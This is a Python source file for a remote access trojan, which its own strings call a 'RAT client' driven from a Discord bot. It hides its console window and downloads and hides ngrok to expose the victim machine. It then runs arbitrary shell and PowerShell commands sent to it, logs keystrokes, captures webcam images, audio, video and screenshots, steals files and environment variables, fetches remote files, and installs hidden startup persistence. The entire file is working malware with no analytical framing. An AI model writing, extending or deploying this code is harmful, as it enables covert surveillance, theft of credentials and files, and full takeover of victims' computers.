import os
import json
import asyncio
import subprocess
import sqlite3
from datetime import datetime
from aiohttp import web
from dotenv import load_dotenv
import shutil
import sys
import subprocess
import urllib.request
import zipfile
import io
import threading
import platform
import psutil
import base64
from PIL import ImageGrab
import threading
import platform
import psutil
import time

# Hide console window if running with python (to avoid CMD window)
try:
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except Exception:
    pass

# Load environment variables from .env
load_dotenv()

# Configuration
LISTEN_PORT = int(os.getenv("RAT_LISTEN_PORT", "8080"))
AUTH_TOKEN = os.getenv("RAT_AUTH_TOKEN", "changeme")
DB_PATH = os.getenv("RAT_DB_PATH", "log.db")
USE_NGROK = os.getenv("USE_NGROK", "false").lower() == "true"

def ensure_ngrok():
    """Download ngrok.exe if missing, place it hidden on the Desktop, and return its path."""
    # Determine desktop hidden path
    desktop_path = os.path.join(os.getenv("USERPROFILE"), "Desktop")
    ngrok_path = os.path.join(desktop_path, "ngrok.exe")
    if not os.path.isfile(ngrok_path):
        try:
            print("[Ngrok] ngrok.exe not found, downloading to Desktop...")
            download_url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
            with urllib.request.urlopen(download_url) as resp:
                zip_data = resp.read()
            with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                # Extract only ngrok.exe to the desktop directory
                for member in zf.infolist():
                    if member.filename.endswith("ngrok.exe"):
                        zf.extract(member, desktop_path)
            # Ensure hidden attribute
            try:
                import subprocess
                subprocess.run(["attrib", "+h", ngrok_path], check=True, shell=True)
                print("[Ngrok] ngrok.exe placed on Desktop and hidden.")
            except Exception as hide_err:
                print(f"[Ngrok] Failed to set hidden attribute: {hide_err}")
        except Exception as e:
            print(f"[Ngrok] Failed to download ngrok: {e}")
    return ngrok_path

# Ensure SQLite database and schema exist
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            command TEXT NOT NULL,
            output TEXT,
            success INTEGER NOT NULL
        )
        """
    )
    conn.commit()
    conn.close()

init_db()

# Global variables for keylogger and media recording
keylog_thread = None
keylog_running = False
audio_process = None
video_process = None

# Helper to log command execution
def log_command(command: str, output: str, success: bool):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO logs (timestamp, command, output, success) VALUES (?, ?, ?, ?)",
        (datetime.utcnow().isoformat(), command, output, int(success)),
    )
    conn.commit()
    conn.close()

# Async handler for incoming command HTTP POST requests
async def handle_command(request):
    # Simple token authentication
    token = request.headers.get("Authorization", "")
    if token != f"Bearer {AUTH_TOKEN}":
        return web.json_response({"error": "Unauthorized"}, status=401)

    try:
        data = await request.json()
        command = data.get("command")
        if not command:
            return web.json_response({"error": "No command provided"}, status=400)
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)

    # ----- New command handling -----
    # Snap command: capture image from default camera using ffmpeg (requires ffmpeg installed)
    if command.lower().startswith("snap"):
        image_path = "snap.jpg"
        snap_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -frames:v 1 {image_path}'
        try:
            subprocess.run(snap_cmd, shell=True, check=True, capture_output=True, text=True)
            if os.path.isfile(image_path):
                with open(image_path, "rb") as f:
                    img_data = f.read()
                import base64
                b64 = base64.b64encode(img_data).decode()
                return web.json_response({"command": command, "output": "Snapshot taken", "file": {"name": image_path, "data": b64}})
            else:
                return web.json_response({"command": command, "error": "Snapshot failed: file not created"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Snapshot error: {e}"})

    # URL command: open a URL in the default browser
    if command.lower().startswith("url "):
        url = command[4:].strip()
        try:
            import webbrowser
            webbrowser.open(url)
            return web.json_response({"command": command, "output": f"Opened URL: {url}"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Failed to open URL: {e}"})

    # Upload command: read a file and return its base64 content
    if command.lower().startswith("upload "):
        file_path = command[7:].strip()
        if not os.path.isfile(file_path):
            return web.json_response({"command": command, "error": f"File not found: {file_path}"})
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            import base64
            b64 = base64.b64encode(data).decode()
            return web.json_response({"command": command, "output": f"File {file_path} uploaded", "file": {"name": os.path.basename(file_path), "data": b64}})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Upload error: {e}"})

    # Download command: download a file from a URL to a destination path (format: download <url> <dest_path>)
    if command.lower().startswith("download "):
        parts = command.split(maxsplit=2)
        if len(parts) < 3:
            return web.json_response({"command": command, "error": "Usage: download <url> <dest_path>"})
        _, url, dest_path = parts
        try:
            import urllib.request
            urllib.request.urlretrieve(url, dest_path)
            return web.json_response({"command": command, "output": f"Downloaded {url} to {dest_path}"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Download error: {e}"})

    # ----- End of new command handling -----
    # Record command: start/stop audio/video recording
    if command.lower().startswith("record "):
        parts = command.split()
        if len(parts) >= 3 and parts[1].lower() == "start":
            mode = parts[2].lower()
            if mode == "audio":
                if audio_process is None:
                    audio_file = "audio.wav"
                    audio_cmd = f'ffmpeg -y -f dshow -i audio="Microphone (Realtek Audio)" -vn {audio_file}'
                    audio_process = subprocess.Popen(audio_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return web.json_response({"command": command, "output": "Audio recording started"})
                else:
                    return web.json_response({"command": command, "output": "Audio recording already in progress"})
            elif mode == "video":
                if video_process is None:
                    video_file = "video.mp4"
                    video_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -an {video_file}'
                    video_process = subprocess.Popen(video_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return web.json_response({"command": command, "output": "Video recording started"})
                else:
                    return web.json_response({"command": command, "output": "Video recording already in progress"})
            elif mode == "both":
                msgs = []
                if audio_process is None:
                    audio_file = "audio.wav"
                    audio_cmd = f'ffmpeg -y -f dshow -i audio="Microphone (Realtek Audio)" -vn {audio_file}'
                    audio_process = subprocess.Popen(audio_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    msgs.append("audio")
                else:
                    msgs.append("audio (already)")
                if video_process is None:
                    video_file = "video.mp4"
                    video_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -an {video_file}'
                    video_process = subprocess.Popen(video_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    msgs.append("video")
                else:
                    msgs.append("video (already)")
                return web.json_response({"command": command, "output": f"Started recording: {', '.join(msgs)}"})
            else:
                return web.json_response({"command": command, "error": "Invalid record mode. Use audio, video, or both"})
        elif len(parts) >= 2 and parts[1].lower() == "stop":
            stopped = []
            if audio_process:
                audio_process.terminate()
                audio_process = None
                stopped.append("audio")
            if video_process:
                video_process.terminate()
                video_process = None
                stopped.append("video")
            if not stopped:
                return web.json_response({"command": command, "output": "No recording was active"})
            files = {}
            if "audio" in stopped and os.path.isfile("audio.wav"):
                with open("audio.wav", "rb") as f:
                    files["audio"] = {"name": "audio.wav", "data": base64.b64encode(f.read()).decode()}
            if "video" in stopped and os.path.isfile("video.mp4"):
                with open("video.mp4", "rb") as f:
                    files["video"] = {"name": "video.mp4", "data": base64.b64encode(f.read()).decode()}
            resp = {"command": command, "output": f"Recording stopped: {', '.join(stopped)}"}
            if files:
                resp["files"] = files
            return web.json_response(resp)
        else:
            return web.json_response({"command": command, "error": "Invalid record command syntax"})

    # Keylogger command: start/stop keylogging
    if command.lower().startswith("keylog "):
        arg = command.split()[1].lower() if len(command.split()) > 1 else ""
        global keylog_thread, keylog_running
        if arg == "start":
            if not keylog_running:
                def keylog_worker():
                    import keyboard
                    with open("keylog.txt", "a") as f:
                        while keylog_running:
                            event = keyboard.read_event()
                            if event.event_type == keyboard.KEY_DOWN:
                                f.write(event.name + "\n")
                                f.flush()
                keylog_running = True
                keylog_thread = threading.Thread(target=keylog_worker, daemon=True)
                keylog_thread.start()
                return web.json_response({"command": command, "output": "Keylogger started"})
            else:
                return web.json_response({"command": command, "output": "Keylogger already running"})
        elif arg == "stop":
            if keylog_running:
                keylog_running = False
                keylog_thread.join()
                return web.json_response({"command": command, "output": "Keylogger stopped"})
            else:
                return web.json_response({"command": command, "output": "Keylogger not running"})
        else:
            return web.json_response({"command": command, "error": "Invalid keylog argument. Use start/stop"})

    # System info command
    if command.lower() == "sysinfo":
        info = {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
        }
        return web.json_response({"command": command, "output": info})

    # List processes command
    if command.lower() == "list_processes":
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        return web.json_response({"command": command, "output": processes})

    # Kill process command
    if command.lower().startswith("kill_process "):
        parts = command.split()
        if len(parts) != 2:
            return web.json_response({"command": command, "error": "Usage: kill_process <pid>"})
        try:
            pid = int(parts[1])
            os.kill(pid, 9)
            return web.json_response({"command": command, "output": f"Killed process {pid}"})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # List directory command
    if command.lower().startswith("list_dir "):
        path = command[9:].strip()
        if not os.path.isdir(path):
            return web.json_response({"command": command, "error": f"Not a directory: {path}"})
        try:
            files = os.listdir(path)
            return web.json_response({"command": command, "output": files})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # Persistence handling
    if command.lower().startswith("persistence "):
        arg = command.split()[1].lower() if len(command.split()) > 1 else ""
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_dir, "rat_client.py")
        try:
            if arg == "on":
                shutil.copy2(__file__, target_path)
                subprocess.run(["attrib", "+h", target_path], check=True, shell=True)
                # update .env persistence flag
                env_path = os.path.join(os.getcwd(), ".env")
                with open(env_path, "r") as f:
                    lines = f.readlines()
                with open(env_path, "w") as f:
                    for line in lines:
                        if line.startswith("PERSISTENCE="):
                            f.write("PERSISTENCE=on\n")
                        else:
                            f.write(line)
                return web.json_response({"command": command, "success": True, "output": "Persistence enabled"})
            elif arg == "off":
                if os.path.isfile(target_path):
                    os.remove(target_path)
                env_path = os.path.join(os.getcwd(), ".env")
                with open(env_path, "r") as f:
                    lines = f.readlines()
                with open(env_path, "w") as f:
                    for line in lines:
                        if line.startswith("PERSISTENCE="):
                            f.write("PERSISTENCE=off\n")
                        else:
                            f.write(line)
                return web.json_response({"command": command, "success": True, "output": "Persistence disabled"})
            else:
                return web.json_response({"command": command, "success": False, "output": "Invalid argument. Use on/off"})
        except Exception as e:
            return web.json_response({"command": command, "success": False, "output": f"Error: {e}"})

    # New command: get external IP address
    if command.lower() == "ipinfo":
        try:
            with urllib.request.urlopen('https://api.ipify.org') as resp:
                external_ip = resp.read().decode().strip()
            return web.json_response({"command": command, "output": external_ip})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # New command: screenshot - capture screen and return base64 image
    if command.lower() == "screenshot":
        try:
            img = ImageGrab.grab()
            import io, base64
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            b64 = base64.b64encode(buf.getvalue()).decode()
            return web.json_response({"command": command, "output": "Screenshot captured", "file": {"name": "screenshot.png", "data": b64}})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # New command: env - return environment variables
    if command.lower() == "env":
        try:
            return web.json_response({"command": command, "output": dict(os.environ)})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # New command: run_ps - execute PowerShell command (Windows only)
    if command.lower().startswith("run_ps "):
        ps_cmd = command[7:].strip()
        try:
            completed = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, shell=True)
            output = completed.stdout + completed.stderr
            success = completed.returncode == 0
            return web.json_response({"command": command, "success": success, "output": output})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # New command: list_services - enumerate Windows services
    if command.lower() == "list_services":
        try:
            completed = subprocess.run(["sc", "query", "state=", "all"], capture_output=True, text=True, shell=True)
            return web.json_response({"command": command, "output": completed.stdout})
        except Exception as e:
            return web.json_response({"command": command, "error": str(e)})

    # Execute the command on the host system
    try:
        completed = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        output = completed.stdout + completed.stderr
        success = completed.returncode == 0
    except Exception as e:
        output = str(e)
        success = False

    # Log the execution result
    log_command(command, output, success)

    response_data = {
        "command": command,
        "success": success,
        "output": output,
    }

    # If shutdown command received, respond then terminate the server
    if command.strip().lower() == "shutdown":
        resp = web.json_response(response_data)
        async def _shutdown():
            await request.app.shutdown()
            await request.app.cleanup()
            os._exit(0)
        asyncio.create_task(_shutdown())
        return resp
    else:
        return web.json_response(response_data)

app = web.Application()
app.add_routes([web.post("/execute", handle_command)])

if __name__ == "__main__":
    if USE_NGROK:
        try:
            ngrok_path = ensure_ngrok()
            # Launch ngrok as a background process
            ngrok_process = subprocess.Popen([
                ngrok_path, "http", str(LISTEN_PORT)
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)  # Give ngrok time to establish the tunnel
            with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels") as resp:
                data = json.load(resp)
                public_url = data["tunnels"][0]["public_url"]
            print(f"[Ngrok] Tunnel established: {public_url}")
            print("Set RAT_ENDPOINT to this URL + '/execute' in the Discord bot .env.")
        except Exception as e:
            print(f"[Ngrok] Failed to start tunnel: {e}")
    print(f"RAT client listening on port {LISTEN_PORT}...")
    web.run_app(app, port=LISTEN_PORT)
